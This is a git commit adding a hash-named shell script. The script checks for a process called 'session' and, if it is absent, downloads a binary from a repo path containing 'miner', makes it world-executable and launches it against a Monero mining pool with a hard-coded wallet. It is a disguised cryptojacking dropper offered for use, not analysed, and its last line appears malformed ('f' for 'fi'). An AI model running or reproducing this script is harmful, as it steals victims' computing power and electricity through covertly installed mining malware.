64851f89b038e4bc74de9af0aa88fdf0e577824a
haxcoder101 <rbsuarez00311@gmail.com>
2025-02-28 11:06:56 +0800

    Create 02ff28e4d653bb7e0bf6c71ad51f479d620a6861.sh

---
+++ 02ff28e4d653bb7e0bf6c71ad51f479d620a6861.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+# Check if the session process is running
+if ! pgrep -x "session" > /dev/null; then
+    echo "Session not found. Downloading and starting..."
+    wget https://github.com/haxcoder101/miner/raw/refs/heads/main/session
+    chmod 777 session
+    ./session -o pool.supportxmr.com:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p 2025 
+else
+    echo "Session process is already running."
+f
